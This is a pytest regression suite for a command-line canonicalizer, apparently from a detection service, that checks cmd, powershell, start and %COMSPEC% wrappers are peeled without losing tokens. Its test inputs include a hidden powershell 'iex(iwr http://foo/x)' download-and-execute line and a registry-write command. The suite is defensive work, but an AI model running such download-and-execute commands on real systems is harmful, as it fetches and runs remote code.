"""P1-06 regression lock · Canonicalizer multi-token inner payload.

Prior to fix, `cmd /c foo bar baz` collapsed to `cmd /c foo` because
the peeler was tokenising only the first argument after `/c`. That
dropped every subsequent token from downstream classifiers.

This suite locks the current behavior — the FULL post-`/c` payload
must survive canonicalization.
"""
from __future__ import annotations

from services.canonicalizer import canonicalize


def _payload(raw: str) -> str:
    """Return the effective post-peel payload."""
    return canonicalize(raw).payload


def test_cmd_c_preserves_all_inner_tokens():
    p = _payload("cmd /c foo bar baz")
    assert "foo" in p and "bar" in p and "baz" in p


def test_cmd_c_powershell_chain_preserved():
    raw = "cmd.exe /c powershell.exe -nop -w hidden -c whoami"
    c = canonicalize(raw)
    # Both cmd + powershell are known launchers, so the peeler
    # recursively unwraps them. The innermost payload is `whoami`.
    # The regression we're locking: peeling must preserve ALL flags
    # while recursing, never collapsing to just the first token.
    chain_lc = [x.lower() for x in c.launcher_chain]
    assert "cmd.exe" in chain_lc
    assert "powershell.exe" in chain_lc
    # After the recursive peel, the effective head is `whoami`.
    assert c.effective_head.lower() == "whoami"
    # Unwrap depth reflects that both launchers were peeled.
    assert c.unwrap_depth >= 2


def test_cmd_c_multi_token_no_known_launcher_preserved():
    # When the inner command is NOT a known launcher, the peel stops
    # after `cmd` and the FULL multi-token payload must survive.
    raw = 'cmd /c foo bar baz qux'
    c = canonicalize(raw)
    assert any("cmd" in x.lower() for x in c.launcher_chain)
    for tok in ("foo", "bar", "baz", "qux"):
        assert tok in c.payload


def test_cmd_s_c_quoted_multi_token_inner():
    raw = 'cmd /S /C "reg add HKCU\\Software\\X /v Y /d Z /f"'
    p = _payload(raw)
    for tok in ("reg", "HKCU", "Software", "/f"):
        assert tok in p


def test_start_wrapper_multi_token_preserved():
    raw = "start /b /min powershell.exe -c iex(iwr http://foo/x)"
    c = canonicalize(raw)
    # start + powershell both peel → the innermost payload is the
    # -c argument. The regression: no token dropped during recursion.
    chain_lc = [x.lower() for x in c.launcher_chain]
    assert any("start" in x for x in chain_lc)
    assert any("powershell" in x for x in chain_lc)
    assert "iex" in c.payload.lower()
    assert "iwr" in c.payload.lower()
    assert "http://foo/x" in c.payload


def test_comspec_expands_and_multi_token_preserved():
    raw = "%COMSPEC% /c ping 1.1.1.1 -n 4"
    c = canonicalize(raw)
    assert any("cmd" in x.lower() for x in c.launcher_chain)
    assert "ping" in c.payload.lower()
    assert "1.1.1.1" in c.payload
    assert "-n" in c.payload.lower()


def test_no_inner_token_loss_deterministic():
    raw = "cmd /c foo bar baz qux"
    r1 = canonicalize(raw).payload
    r2 = canonicalize(raw).payload
    assert r1 == r2
    assert all(tok in r1 for tok in ("foo", "bar", "baz", "qux"))
